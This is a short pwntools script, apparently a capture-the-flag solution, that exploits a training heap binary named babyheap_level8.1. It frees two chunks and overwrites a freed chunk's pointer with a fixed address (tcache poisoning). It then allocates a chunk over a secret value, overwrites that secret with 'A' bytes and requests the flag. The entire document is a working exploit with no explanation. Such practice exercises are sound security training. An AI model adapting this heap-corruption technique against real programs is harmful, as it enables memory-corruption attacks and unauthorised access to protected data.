from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
BINARY = "/challenge/babyheap_level8.1"
p = process(BINARY)
# p = gdb.debug(BINARY, gdbscript="source /opt/gef/gef.py")
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'424')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'424')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(p64(0x429E00))
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'424')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'424')
# overwrite secret
p.sendline(b'scanf')
p.sendline(b'1')
p.sendline(b'A'*400)
# overwritten secret


p.sendline(b"send_flag")
p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAA")
p.interactive()